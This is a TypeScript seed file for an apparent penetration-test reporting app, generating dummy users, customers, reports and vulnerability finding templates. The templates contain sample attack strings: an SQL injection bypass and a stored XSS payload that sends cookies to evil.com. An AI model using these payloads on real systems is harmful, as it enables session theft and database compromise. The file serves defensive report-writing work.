"use server";

import { assertDevelopment } from "@/lib/env";
import { auth } from "@/lib/auth";
import { db } from "@/lib/db";
import {
  users,
  customers,
  reports,
  deliverables,
  cweEntries,
  owaspEntries,
  findingTemplates,
} from "@/lib/db/schema";
import { eq, sql } from "drizzle-orm";
import { revalidatePath } from "next/cache";
import bcrypt from "bcryptjs";

// ═══════════════════════════════════════════════════════════
//  Types
// ═══════════════════════════════════════════════════════════

export type SeedResult = {
  success: boolean;
  error?: string;
  count?: number;
};

// ═══════════════════════════════════════════════════════════
//  Helpers — lightweight faker-like generators
//  (We use @faker-js/faker via dynamic import so it stays
//   tree-shaken in prod builds.)
// ═══════════════════════════════════════════════════════════

async function getFaker() {
  const { faker } = await import("@faker-js/faker");
  return faker;
}

function pick<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randomInt(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

// ═══════════════════════════════════════════════════════════
//  Auth guard
// ═══════════════════════════════════════════════════════════

async function requireAdmin() {
  assertDevelopment();
  const session = await auth();
  if (!session || session.user.role !== "administrator") {
    throw new Error("Only administrators can seed data in development.");
  }
  return session;
}

// ═══════════════════════════════════════════════════════════
//  1. SEED USERS
// ═══════════════════════════════════════════════════════════

export async function seedUsersAction(): Promise<SeedResult> {
  try {
    await requireAdmin();

    const faker = await getFaker();
    const passwordHash = await bcrypt.hash("password123", 10);

    const dummyUsers = Array.from({ length: 8 }, (_, i) => {
      const firstName = faker.person.firstName();
      const lastName = faker.person.lastName();
      const role = i < 4 ? "editor" : "viewer";
      return {
        username: faker.internet
          .username({ firstName, lastName })
          .toLowerCase()
          .slice(0, 50),
        email: faker.internet.email({ firstName, lastName }).toLowerCase(),
        passwordHash,
        role: role as "editor" | "viewer",
      };
    });

    let inserted = 0;
    for (const u of dummyUsers) {
      // skip duplicates
      const [existing] = await db
        .select()
        .from(users)
        .where(eq(users.username, u.username))
        .limit(1);
      if (!existing) {
        await db.insert(users).values(u);
        inserted++;
      }
    }

    revalidatePath("/users");
    return { success: true, count: inserted };
  } catch (error) {
    console.error("seedUsersAction:", error);
    return {
      success: false,
      error: error instanceof Error ? error.message : "Failed to seed users",
    };
  }
}

// ═══════════════════════════════════════════════════════════
//  2. SEED CUSTOMERS
// ═══════════════════════════════════════════════════════════

export async function seedCustomersAction(): Promise<SeedResult> {
  try {
    await requireAdmin();

    const dummyCustomers = [
      { name: "PT Profindo Sekuritas Indonesia", code: "RG" },
      { name: "PT Laba Sekuritas", code: "TF" },
      { name: "PT Semesta Indovest Sekuritas", code: "MG" },
      { name: "Henan Putihrai", code: "HP" },
      { name: "PT RHB Sekuritas Indonesia", code: "DR" },
      { name: "PT Sukadana Prima Sekuritas", code: "AD" },
      { name: "Elit Sukses Sekuritas", code: "SA" },
    ];

    let inserted = 0;
    for (const c of dummyCustomers) {
      const [existing] = await db
        .select()
        .from(customers)
        .where(eq(customers.name, c.name))
        .limit(1);
      if (!existing) {
        await db.insert(customers).values(c);
        inserted++;
      }
    }

    revalidatePath("/customers");
    return { success: true, count: inserted };
  } catch (error) {
    console.error("seedCustomersAction:", error);
    return {
      success: false,
      error:
        error instanceof Error ? error.message : "Failed to seed customers",
    };
  }
}

// ═══════════════════════════════════════════════════════════
//  3. SEED KNOWLEDGE BASE (CWE + OWASP + Templates)
// ═══════════════════════════════════════════════════════════

const SAMPLE_TEMPLATES: {
  title: string;
  severity: "Critical" | "High" | "Medium" | "Low" | "Info";
  cvssScore: string;
  cvssVector: string;
  cweRef: number;
  description: string;
  impact: string;
  recommendation: string;
  referencesLink: string;
}[] = [
  {
    title: "SQL Injection in Login Form",
    severity: "Critical",
    cvssScore: "9.8",
    cvssVector:
      "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
    cweRef: 89,
    description: `The application's login endpoint constructs SQL queries using unsanitized user input, allowing an attacker to inject arbitrary SQL commands.

\\textbf{Affected Parameter:} \\texttt{username}

\\begin{itemize}
  \\item Authentication bypass via \\texttt{' OR 1=1 --}
  \\item Data exfiltration through UNION-based injection
  \\item Potential for Remote Code Execution via \\texttt{xp\\_cmdshell}
\\end{itemize}

The risk score is calculated as: $CVSS = 9.8$ (Critical).`,
    impact: `\\textbf{Business Impact:}

\\begin{enumerate}
  \\item \\textbf{Confidentiality:} Full database compromise — all user credentials, PII, and financial records exposed.
  \\item \\textbf{Integrity:} Attacker can modify or delete records: $\\Delta_{data} = \\text{total corruption}$.
  \\item \\textbf{Availability:} Potential for complete service disruption via \\texttt{DROP TABLE} statements.
\\end{enumerate}

Estimated financial impact: \\$50{,}000 — \\$500{,}000 depending on data volume.`,
    recommendation: `\\textbf{Remediation Steps:}

\\begin{enumerate}
  \\item Replace all dynamic SQL with \\textbf{parameterized queries} (prepared statements):
  \\begin{verbatim}
  const result = await db.query(
    "SELECT * FROM users WHERE username = ?",
    [username]
  );
  \\end{verbatim}
  \\item Implement an \\textbf{ORM} (e.g. Drizzle, Prisma) for all database interactions.
  \\item Deploy a \\textbf{Web Application Firewall} (WAF) with SQL injection rule sets.
  \\item Apply \\textbf{least privilege} database accounts — never use \\texttt{root}.
\\end{enumerate}`,
    referencesLink:
      "https://owasp.org/www-community/attacks/SQL_Injection\nhttps://cwe.mitre.org/data/definitions/89.html",
  },
  {
    title: "Stored Cross-Site Scripting (XSS) in User Profile",
    severity: "High",
    cvssScore: "7.5",
    cvssVector:
      "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N",
    cweRef: 79,
    description: `A stored XSS vulnerability exists in the user profile \\texttt{bio} field. User-supplied HTML/JavaScript is rendered without sanitization when viewed by other users.

\\textbf{Payload:}
\\begin{verbatim}
<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
\\end{verbatim}

This affects all pages that display user profile information, with $n_{affected} \\geq 15$ endpoints.`,
    impact: `\\textbf{Impact Analysis:}

\\begin{itemize}
  \\item \\textbf{Session Hijacking:} Attacker can steal session cookies, leading to account takeover.
  \\item \\textbf{Phishing:} Injected content can display fake login forms.
  \\item \\textbf{Worm Propagation:} Self-replicating XSS can spread across all user profiles.
\\end{itemize}

The probability of exploitation is $P(exploit) \\approx 0.85$ given the low skill required.`,
    recommendation: `\\textbf{Remediation:}

\\begin{enumerate}
  \\item Apply \\textbf{output encoding} using context-appropriate functions (HTML, JS, URL, CSS contexts).
  \\item Implement a strict \\textbf{Content Security Policy} (CSP):
  \\begin{verbatim}
  Content-Security-Policy: default-src 'self';
    script-src 'self'; style-src 'self' 'unsafe-inline';
  \\end{verbatim}
  \\item Use a server-side HTML sanitizer (e.g. DOMPurify, sanitize-html).
  \\item Set \\texttt{HttpOnly} and \\texttt{SameSite=Strict} flags on session cookies.
\\end{enumerate}`,
    referencesLink:
      "https://owasp.org/www-community/attacks/xss/\nhttps://cwe.mitre.org/data/definitions/79.html",
  },
  {
    title: "Insecure Direct Object Reference (IDOR) in API",
    severity: "High",
    cvssScore: "7.1",
    cvssVector:
      "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
    cweRef: 639,
    description: `The REST API endpoint \\texttt{/api/v1/documents/\\{id\\}} does not validate that the requesting user owns the document. An authenticated user can enumerate and access any document by modifying the \\texttt{id} parameter.

\\textbf{Test Case:}
\\begin{verbatim}
GET /api/v1/documents/1001 HTTP/1.1
Authorization: Bearer <user_B_token>
\\end{verbatim}

Returns document belonging to User A — authorization check is $\\nexists$.`,
    impact: `Unauthorized access to \\textbf{all documents} in the system. With $N = |documents|$ total records, any authenticated user can access $100\\%$ of data.

\\begin{itemize}
  \\item \\textbf{Data Breach:} Confidential reports, contracts, and PII exposed.
  \\item \\textbf{Compliance:} GDPR, HIPAA, PCI-DSS violations.
  \\item \\textbf{Reputational Damage:} Loss of customer trust.
\\end{itemize}`,
    recommendation: `\\begin{enumerate}
  \\item Implement \\textbf{row-level authorization} checks in every data-access function:
  \\begin{verbatim}
  if (document.ownerId !== session.userId) {
    return res.status(403).json({ error: "Forbidden" });
  }
  \\end{verbatim}
  \\item Use \\textbf{UUIDs} instead of sequential IDs to reduce enumeration risk.
  \\item Add \\textbf{automated IDOR tests} to CI/CD pipeline.
\\end{enumerate}`,
    referencesLink:
      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References\nhttps://cwe.mitre.org/data/definitions/639.html",
  },
  {
    title: "Missing Rate Limiting on Authentication Endpoint",
    severity: "Medium",
    cvssScore: "5.9",
    cvssVector:
      "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
    cweRef: 307,
    description: `The \\texttt{/api/auth/login} endpoint lacks rate limiting, allowing unlimited authentication attempts. Brute-force attacks can test $\\sim 10{,}000$ passwords per minute.

The expected time to crack a 6-character password is:
$$T = \\frac{|C|^n}{r} = \\frac{62^6}{10000 \\cdot 60} \\approx 930 \\text{ hours}$$

where $|C| = 62$ (alphanumeric charset), $n = 6$, and $r = 10{,}000$ req/min.`,
    impact: `\\begin{itemize}
  \\item Weak passwords compromised within hours.
  \\item Credential stuffing attacks from breached databases.
  \\item Account lockout DoS if combined with automated tools.
\\end{itemize}`,
    recommendation: `\\begin{enumerate}
  \\item Implement \\textbf{rate limiting}: max 5 attempts per 15 minutes per IP/account.
  \\item Add \\textbf{CAPTCHA} after 3 failed attempts.
  \\item Implement \\textbf{account lockout} with exponential backoff: $t_{wait} = 2^{n-3}$ minutes after $n > 3$ failures.
  \\item Deploy \\textbf{MFA} for all accounts.
\\end{enumerate}`,
    referencesLink:
      "https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks",
  },
  {
    title: "Sensitive Data Exposure in Error Messages",
    severity: "Low",
    cvssScore: "3.7",
    cvssVector:
      "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
    cweRef: 200,
    description: `The application returns detailed error messages including stack traces, database schema information, and internal file paths in HTTP 500 responses.

\\textbf{Example response body:}
\\begin{verbatim}
{
  "error": "ER_NO_SUCH_TABLE",
  "sql": "SELECT * FROM users_backup WHERE ...",
  "file": "/app/src/services/UserService.ts:142"
}
\\end{verbatim}

Information leakage score: $I = \\sum_{i=1}^{k} w_i \\cdot d_i$ where $d_i$ represents each data category disclosed.`,
    impact: `This vulnerability provides attackers with reconnaissance information:
\\begin{itemize}
  \\item Internal \\textbf{file structure} and technology stack.
  \\item \\textbf{Database table names} and query patterns.
  \\item Potential \\textbf{SQL injection points} from exposed queries.
\\end{itemize}

While not directly exploitable, it significantly reduces the attacker's effort for follow-up attacks.`,
    recommendation: `\\begin{enumerate}
  \\item Configure \\textbf{generic error pages} for all HTTP 4xx/5xx responses in production.
  \\item Implement \\textbf{centralized error handling} middleware:
  \\begin{verbatim}
  app.use((err, req, res, next) => {
    logger.error(err);
    res.status(500).json({ error: "Internal Server Error" });
  });
  \\end{verbatim}
  \\item Log detailed errors to a secure \\textbf{SIEM/logging service}, never to users.
\\end{enumerate}`,
    referencesLink:
      "https://cwe.mitre.org/data/definitions/200.html\nhttps://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/",
  },
];

export async function seedKnowledgeBaseAction(): Promise<SeedResult> {
  try {
    await requireAdmin();

    // 1. Verify CWE/OWASP entries exist (they should from the standard seeder)
    const existingCwe = await db.select({ id: cweEntries.id }).from(cweEntries);
    const existingOwasp = await db.select({ id: owaspEntries.id }).from(owaspEntries);

    // 2. Insert sample finding templates
    let inserted = 0;
    for (const tpl of SAMPLE_TEMPLATES) {
      // Find matching CWE
      const cweId = existingCwe.find((c) => c.id === tpl.cweRef)?.id ?? null;
      // Pick a random OWASP
      const owaspId =
        existingOwasp.length > 0
          ? pick(existingOwasp).id
          : null;

      await db.insert(findingTemplates).values({
        title: tpl.title,
        severity: tpl.severity,
        cvssScore: tpl.cvssScore,
        cvssVector: tpl.cvssVector,
        description: tpl.description,
        impact: tpl.impact,
        recommendation: tpl.recommendation,
        referencesLink: tpl.referencesLink,
        cweId,
        owaspId,
      });
      inserted++;
    }

    revalidatePath("/kb/templates");
    revalidatePath("/kb/frameworks");
    return { success: true, count: inserted };
  } catch (error) {
    console.error("seedKnowledgeBaseAction:", error);
    return {
      success: false,
      error: error instanceof Error ? error.message : "Failed to seed KB",
    };
  }
}

// ═══════════════════════════════════════════════════════════
//  4. SEED REPORTS (Draft Contributions + Master Reports)
// ═══════════════════════════════════════════════════════════

const SAMPLE_CVSS_VECTORS = [
  "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N", // Critical ~9.8
  "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N", // High ~7.5
  "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N", // High ~7.1
  "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N", // Medium ~5.9
  "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N", // Low ~3.7
  "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:N/SA:N", // Critical ~9.5
  "CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N", // High ~8.5
  "CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:L/VA:L/SC:N/SI:N/SA:N", // Medium ~6.0
  "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N", // High ~7.8
  "CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N", // Low ~2.1
];

const SAMPLE_REPORT_TITLES = [
  "Web Application Penetration Test",
  "API Security Assessment",
  "Cloud Infrastructure Security Review",
  "Mobile Application Security Audit",
  "Network Penetration Testing",
  "Source Code Security Review",
  "Wireless Security Assessment",
  "Social Engineering Assessment",
  "IoT Device Security Evaluation",
  "Red Team Engagement — External",
  "Internal Network Assessment",
  "Active Directory Security Audit",
  "Container Security Assessment",
  "CI/CD Pipeline Security Review",
  "Third-Party Integration Audit",
];

export async function seedReportsAction(): Promise<SeedResult> {
  try {
    const session = await requireAdmin();

    const faker = await getFaker();

    // Get existing customers and users (editors/admins) as authors
    const existingCustomers = await db
      .select({ id: customers.id })
      .from(customers);
    const existingUsers = await db
      .select({ id: users.id, role: users.role })
      .from(users)
      .where(sql`${users.role} IN ('administrator', 'editor')`);

    if (existingCustomers.length === 0) {
      return {
        success: false,
        error: "No customers found. Seed customers first.",
      };
    }

    const authorIds =
      existingUsers.length > 0
        ? existingUsers.map((u) => u.id)
        : [session.user.id];

    let inserted = 0;

    // ── Historical Reports (spread over last 6 months) ──
    for (let i = 0; i < 8; i++) {
      const customer = pick(existingCustomers);
      const title = `${SAMPLE_REPORT_TITLES[i % SAMPLE_REPORT_TITLES.length]} — ${faker.company.buzzNoun()}`;
      const vector = pick(SAMPLE_CVSS_VECTORS);
      const status = pick(["Open", "Closed", "Closed", "Draft"] as const);
      const reportId = crypto.randomUUID();

      // Spread createdAt over last 6 months
      const monthsAgo = randomInt(0, 5);
      const dayOffset = randomInt(1, 28);
      const createdAt = new Date();
      createdAt.setMonth(createdAt.getMonth() - monthsAgo);
      createdAt.setDate(dayOffset);

      // For closed reports, updatedAt is 5-30 days after createdAt
      const updatedAt = new Date(createdAt);
      if (status === "Closed") {
        updatedAt.setDate(updatedAt.getDate() + randomInt(5, 30));
      }

      await db.insert(reports).values({
        id: reportId,
        customerId: customer.id,
        reportIdCustom: `RPT-${faker.string.alphanumeric(6).toUpperCase()}`,
        title,
        severity: pick(["Critical", "High", "Medium", "Low", "Info"]) as "Critical" | "High" | "Medium" | "Low" | "Info",
        description: `**Description**\n\nThis assessment identified a vulnerability in the ${faker.company.buzzNoun()} application. ${faker.lorem.paragraph()}`,
        location: faker.internet.url(),
        cvssVector: vector,
        impact: `**Overall Impact:** ${faker.lorem.paragraph()}`,
        recommendation: `1. ${faker.hacker.phrase()}\n2. ${faker.hacker.phrase()}\n3. ${faker.hacker.phrase()}`,
        status,
        createdBy: pick(authorIds),
        createdAt,
        updatedAt,
      });

      inserted++;
    }

    revalidatePath("/reports");
    revalidatePath("/");
    return { success: true, count: inserted };
  } catch (error) {
    console.error("seedReportsAction:", error);
    return {
      success: false,
      error:
        error instanceof Error ? error.message : "Failed to seed reports",
    };
  }
}

// ═══════════════════════════════════════════════════════════
//  5. SEED ALL (orchestrator)
// ═══════════════════════════════════════════════════════════

export async function seedAllAction(): Promise<SeedResult> {
  try {
    await requireAdmin();

    const results: SeedResult[] = [];

    results.push(await seedUsersAction());
    results.push(await seedCustomersAction());
    results.push(await seedKnowledgeBaseAction());
    results.push(await seedReportsAction());

    const totalCount = results.reduce((a, r) => a + (r.count ?? 0), 0);
    const errors = results.filter((r) => !r.success).map((r) => r.error);

    if (errors.length > 0) {
      return {
        success: false,
        error: errors.join("; "),
        count: totalCount,
      };
    }

    return { success: true, count: totalCount };
  } catch (error) {
    console.error("seedAllAction:", error);
    return {
      success: false,
      error: error instanceof Error ? error.message : "Failed to seed data",
    };
  }
}

// ═══════════════════════════════════════════════════════════
//  5. CLEAR ALL DUMMY DATA
// ═══════════════════════════════════════════════════════════

export async function clearAllDummyDataAction(): Promise<SeedResult> {
  try {
    await requireAdmin();

    // Order matters due to FK constraints:
    // deliverables → reports → customers, findingTemplates → cweEntries/owaspEntries

    // 1. Delete all deliverables
    await db.delete(deliverables);

    // 2. Delete all reports
    await db.delete(reports);

    // 3. Delete all customers
    await db.delete(customers);

    // 4. Delete finding templates
    await db.delete(findingTemplates);

    // 5. Delete non-admin users (keep the admin account)
    await db.delete(users).where(sql`${users.role} != 'administrator'`);

    // Note: CWE/OWASP entries are kept — they are reference data

    revalidatePath("/");
    revalidatePath("/customers");
    revalidatePath("/users");
    revalidatePath("/reports");
    revalidatePath("/reports/deliverables");
    revalidatePath("/kb/templates");
    revalidatePath("/kb/frameworks");

    return { success: true };
  } catch (error) {
    console.error("clearAllDummyDataAction:", error);
    return {
      success: false,
      error:
        error instanceof Error
          ? error.message
          : "Failed to clear dummy data",
    };
  }
}

